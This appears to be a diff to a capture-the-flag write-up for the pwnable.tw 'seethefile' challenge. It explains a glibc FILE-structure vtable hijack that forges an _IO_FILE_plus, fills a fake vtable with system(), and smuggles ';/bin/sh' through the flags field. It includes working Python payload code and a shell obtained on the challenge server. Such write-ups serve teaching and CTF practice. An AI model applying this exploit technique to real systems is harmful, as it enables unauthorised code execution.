@@ -373,12 +373,16 @@ Let's try it out. This is how the memory layout will look like after we provide 
 
 ![](img/f0.png)
 
+Note: small mistake on pic. there are 32, not 16 bytes between name and fp
+
 ### Exploit path
 Now the question is what next. Our end goal is to spoof a vtable record (we don't know yet which one) and perform some function which will spawn us a shell (`system` is perfect here as we already know libc_base address).
 
 As we already know that we want to spoof vtable we can include this on our schema. On a 32 bit system the vtable lies at 0x94 offset (on 64bit at 0xd8). Let's place the vtable right after the _IO_File_plus struct and fill it with  address of `system` function. Note that we calculate address of system dynamicaly so the constant 0xf7598940 is just an example:
 
 ![](img/f1.png)
+
+Note: small mistake on pic. there are 32, not 16 bytes between name and fp
 
 Let's check fclose implementation:
 
@@ -444,12 +448,92 @@ _flag: 0x4141c141
 
 And let's include it on our schema:
 
+![](img/f2.png)
 
+Note: small mistake on pic. there are 32, not 16 bytes between name and fp
 
+Ok, so there is one last thing we have to deal with. We need to pass a '/bin/sh' argument to system call. At this moment the `system` is called as `system(b'\x41\x41\xc1\x41\x41..')` which for sure will not grant us a shell. Moreover we cannot just modify the argument to '\x41\x41\xc1\x41' as it is _flags field. But we can seperate the /bin/sh command by ';' character and fclose will invoke `system(b'\x41\x41\xc1\x41;/bin/sh')`.
 
+Updated final schema:
 
+![](img/f3.png)
 
+Note: small mistake on pic. there are 32, not 16 bytes between name and fp
 
+Let's try our exploit. We should get a shell!
+
+```bash
+$ python3 exp.py local
+[+] Starting local process './patched': pid 17028
+[*] [x] leaked content of /proc/self/maps
+[*] [x] retrieved libc_base: 0xf7d57000 from leaked /proc/self/maps
+[*] [x] calculated address of system function: 0xf7d91940
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+$ id
+[*] Process './patched' stopped with exit code -11 (SIGSEGV) (pid 17028)
+[*] Got EOF while sending in interactive
+```
+
+Oh, sth. went wrong. And this took me ages before I figured this out. It turns out that `_IO_new_fclose` checks at the beginning if it should use old implementation:
+
+```
+# define _IO_vtable_offset(THIS) (THIS)->_vtable_offset
+
+_IO_new_fclose (_IO_FILE *fp)
+{
+  [..]
+  /* We desperately try to help programs which are using streams in a
+     strange way and mix old and new functions.  Detect old streams
+     here.  */
+  if (_IO_vtable_offset (fp) != 0)
+    return _IO_old_fclose (fp);
+
+  [...]  
+  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
+    _IO_un_link ((struct _IO_FILE_plus *) fp);
+}
+```
+
+meaning that we have to set _vtable_offset field in _IO_File struct to 0.
+
+Our final payload we provide as name:
+
+```python
+payload = b''
+payload += pack('<L', FLAGS) # don't call _IO_close_it, we want to invoke  _IO_FINISH (fp) only;
+payload += b';/bin/sh\x00'
+
+# overwrite FILE* fp to point to NAME_BUF_ADDR
+payload = payload.ljust(FP_OFST, b'A')
+payload += p32(NAME_BUF_ADDR)
+
+# set signed char _vtable_offset to 0, to use _IO_new_fclose
+payload = payload.ljust(OLD_VTABLE_CHAR_OFST, b'A')
+payload += b'\x00'
+
+# overwrite _IO_jump_t *vtable
+payload = payload.ljust(VTABLE_OFST, b'A')
+payload += p32(NAME_BUF_ADDR + VTABLE_OFST + 0x4)
+
+# fake _IO_jump_t, just fill the whole vtable with system_func_addr
+payload += p32(system_func_addr) * 21
+```
+
+Let's test if it works:
+
+```bash
+$ python3 exp.py remote
+[+] Opening connection to chall.pwnable.tw on port 10200: Done
+[*] [x] leaked content of /proc/self/maps
+[*] [x] retrieved libc_base: 0xf7570000 from leaked /proc/self/maps
+[*] [x] calculated address of system function: 0xf75aa940
+[*] Switching to interactive mode
+$ id
+uid=1000(seethefile) gid=1000(seethefile) groups=1000(seethefile)
+```
+
+[Full exploit](exp.py)
 
 
 ## References:
